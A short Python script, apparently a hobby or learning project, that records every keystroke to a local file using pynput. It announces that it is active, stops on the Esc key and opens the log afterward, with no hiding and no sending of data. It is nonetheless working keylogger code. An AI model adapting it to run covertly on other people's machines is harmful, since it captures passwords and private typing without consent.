from pynput import keyboard
from pathlib import Path
import os


LOG_PATH = Path("keylog.txt")


LOG_PATH.write_text("", encoding="utf-8")

def log_keypress(key):    
    try:
        key_text = key.char
    except AttributeError:
        key_text = f"[{key.name}]"
    with LOG_PATH.open("a", encoding="utf-8") as log:
        log.write(key_text)

def handle_release(key):
    if key == keyboard.Key.esc:
        print("\n[🔴] Logging stopped.")
        open_log_file()
        return False

def open_log_file():
    try:
        os.startfile(LOG_PATH.resolve())  # Windows only
    except Exception as e:
        print(f"[!] Could not open log file: {e}")

def show_start_message():
    print("\n🟢 Keylogger is active.")
    print("⌨️  Keystrokes will be saved to:", LOG_PATH.resolve())
    print("🔒 Press ESC to stop logging.\n")


if __name__ == "__main__":
    show_start_message()
    with keyboard.Listener(on_press=log_keypress, on_release=handle_release) as listener:
        listener.join()
